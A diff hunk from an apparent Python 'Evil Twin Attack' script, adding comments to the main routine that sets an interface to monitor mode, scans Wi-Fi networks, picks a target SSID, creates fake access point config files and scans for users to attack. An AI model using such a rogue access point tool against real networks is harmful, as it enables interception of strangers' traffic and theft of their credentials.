@@ -67,17 +67,19 @@ def create_conf_file(iface , ssid):
 
 def main():
     global iface ,ap_mac
-    iface = input("please enter the first interface name: ")
-    iface2= input("Please enter the second interface name: ")
+    iface = input("please enter the first interface name: ") #for sniffing users
+    iface2= input("Please enter the second interface name: ") #for creating fake AP 
+    #step 1: Change the first interface to monitor mode:
     iface = mm.Change_to_MonitorMode_airmon(iface)
     print("********Evil Twin Attack*********")
-    time.sleep(3)
-    Wifi_scaning()
-    # Choose wifi to attack
-    if len(ap_list) > 0 :
+    time.sleep(2)
+    Wifi_scaning() 
+    # Choose access point to attack
+    if len(ap_list) > 0 : 
         mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
         ap_mac = ap_list[mac_adder]
         ssid_name = ssid_list[mac_adder]
+        # for creating the fake AP we need 2 '.conf' files
         create_conf_file(iface2 , ssid_name)
         Users_scaning()
     #Choose user to attack
